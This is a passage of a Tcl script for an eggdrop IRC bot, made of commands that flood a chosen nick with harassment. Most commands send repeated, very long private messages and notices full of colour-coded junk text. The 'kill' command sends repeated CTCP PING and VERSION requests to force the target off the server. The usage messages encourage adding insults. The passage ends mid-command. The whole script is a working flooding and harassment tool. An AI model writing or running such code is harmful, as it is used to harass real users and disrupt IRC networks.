proc pub_plut {nick uhost hand channel rest} {
 set person [lindex $rest 0] 
 set rest [lrange $rest 1 end]
 if {$rest==""} {
  puthelp "NOTICE $person :$rest ,*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@"
  puthelp "PRIVMSG $person :$rest ,*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@"
  puthelp "NOTICE $person :$rest ,*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@"
  puthelp "PRIVMSG $person :$rest ,*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@"
  putlog "  !$hand! plut $person"
  return 0
}
if {$rest!=""} {
  puthelp "NOTICE $person :*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@"
  puthelp "PRIVMSG $person :*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@"
  puthelp "NOTICE $person :*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@"
  puthelp "PRIVMSG $person :*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@"
  putlog "  !$hand! plut $person"
  return 0
 }
}

proc pub_muach {nick uhost hand channel rest} {
 set person [lindex $rest 0] 
 set rest [lrange $rest 1 end]
 if {$rest!=""} {
  puthelp "PRIVMSG $person :$rest,3,7MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçHMüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°3MüäçH°MüäçH°MüäçH°3MüäçH°MüäçH°MüäçH°"
  puthelp "NOTICE $person :$rest,4,9MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH4MüäçH°MüäçH°MüäçH°4MüäçH°MüäçH°MüäçH°4MüäçH°MüäçH°MüäçH°4MüäçH°MüäçH°MüäçH°"
  puthelp "PRIVMSG $person :$rest,12,8MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH12MüäçH°MüäçH°MüäçH°12MüäçH°MüäçH°MüäçH°12MüäçH°MüäçH°MüäçH°12MüäçH°MüäçH°MüäçH°"
  puthelp "NOTICE $person :$rest,8,1MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH8MüäçH°MüäçH°MüäçH°8MüäçH°MüäçH°MüäçH°8MüäçH°MüäçH°MüäçH°8MüäçH°MüäçH°MüäçH°"
  putlog "  !$hand! muach $person"
  return 0
}
if {$rest==""} {
  puthelp "PRIVMSG $person :9,6MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH9MüäçH°MüäçH°MüäçH°9MüäçH°MüäçH°MüäçH°9MüäçH°MüäçH°MüäçH°9MüäçH°MüäçH°MüäçH°"
  puthelp "NOTICE $person :13,14MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH13MüäçH°MüäçH°MüäçH°13MüäçH°MüäçH°MüäçH°13MüäçH°MüäçH°MüäçH°13MüäçH°MüäçH°MüäçH°"
  puthelp "PRIVMSG $person :11,4MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH11MüäçH°MüäçH°MüäçH°11MüäçH°MüäçH°MüäçH°11MüäçH°MüäçH°MüäçH°11MüäçH°MüäçH°MüäçH°"
  puthelp "NOTICE $person :7,10MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH°MüäçH7MüäçH°MüäçH°MüäçH°7MüäçH°MüäçH°MüäçH°7MüäçH°MüäçH°MüäçH°7MüäçH°MüäçH°MüäçH°"
  putlog "  !$hand! muach $person"
  return 0
 }
}
proc pub_kill {nick uhost hand channel rest} { 
 set person [lindex $rest 0]  
 set rest [lrange $rest 1 end] 
 if {$rest!=""} { 
  putserv "PRIVMSG $person :\001PING [unixtime]\001" 
  putserv "PRIVMSG $person :\001VERSION [unixtime]\001" 
  putserv "PRIVMSG $person :\001PING [unixtime]\001" 
  putserv "PRIVMSG $person :\001VERSION [unixtime]\001" 
  putserv "PRIVMSG $person :\001PING [unixtime]\001" 
  putserv "PRIVMSG $person :\001VERSION [unixtime]\001" 
  putlog "!$hand! CTCP pluting" 
  return 0 
 } 
 if {$rest==""} { 
  puthelp "NOTICE $nick :  Usage: kill <nick> <arg>"
 } 
} 
proc pub_crash {nick uhost hand channel rest} { 
 set person [lindex $rest 0]  
 set rest [lrange $rest 1 end] 
 if {$rest!=""} { 
  puthelp "PRIVMSG $person :$rest ,/*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/"
  puthelp "NOTICE $person :$rest ,/*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/"
  puthelp "PRIVMSG $person :$rest ,/*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/"
  puthelp "NOTICE $person :$rest ,/*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*0,4-*0,12-*0,4-*0,12-* /*/*/*/0,4-*0,12-*0,4-*0,12-* /*/*/*/"
  putlog "!$hand! crash $person"
  return 0 
 } 
 if {$rest==""} { 
  puthelp "NOTICE $nick :  Usage: crash <nick> <*add your insult to injury is better :)*>"
 }
} 
proc pub_modar {nick uhost hand channel rest} {
 set person [lindex $rest 0] 
 set rest [lrange $rest 1 end]
 if {$rest!=""} {
  puthelp "PRIVMSG $person :$rest ,3,9|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@8,12#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
  puthelp "NOTICE $person :$rest ,8,1|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@2,13#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
  puthelp "PRIVMSG $person :$rest ,13,4|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||4,15@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@0,3#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
  puthelp "NOTICE $person :$rest ,10,12|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||15,4@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@14,5#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%"
  putlog "!$hand! modar $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :  Usage: modar <nick> <*add your insult to injury is better :)*>"
 }
}
proc pub_hiya {nick uhost hand channel rest} {
 set person [lindex $rest 0] 
 set rest [lrange $rest 1 end]
 if {$rest!=""} {
  puthelp "PRIVMSG $person :$rest ,9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA"
  puthelp "NOTICE $person :$rest ,9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA"
  puthelp "PRIVMSG $person :$rest ,9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA"
  puthelp "NOTICE $person :$rest ,9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA"
  puthelp "PRIVMSG $person :$rest ,9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA"
  puthelp "NOTICE $person :$rest ,9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA"
  putlog "  -> !$hand! hiya $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick : Usage: hiya <nick> <*add your insult to injury is better :)*>"
 }
}
proc pub_beb {nick uhost hand channel rest} {
 set person [lindex $rest 0] 
 set rest [lrange $rest 1 end]
 if {$rest!=""} {
  puthelp "PRIVMSG $person :$rest ,4,11BeBeK 5aDuS 6kAlI 12WekZ13WekZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7k Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ 12,4BeB14eK aD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ 11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS 3kAl6I Wek5ZWek15Z We13kZWek W9ekZW2ekZ 9,1BeBeK a14DuS k14AlI W13ekZWe12kZ We11kZWek 10WekZ9WekZ 8,2BeBeK 7aDuS 6kAlI5 Wek4ZWekZ3 Wek2ZWek 1WekZW15ekZ 13,9Be14BeK 13aDuS k12AlI We10kZWek14Z We8kZWek 7WekZW6ekZ 12,7BeBeK 8aDuS 13kAlI 6WekZ5WekZ4 Wek3ZWek2 WekZ1WekZ"
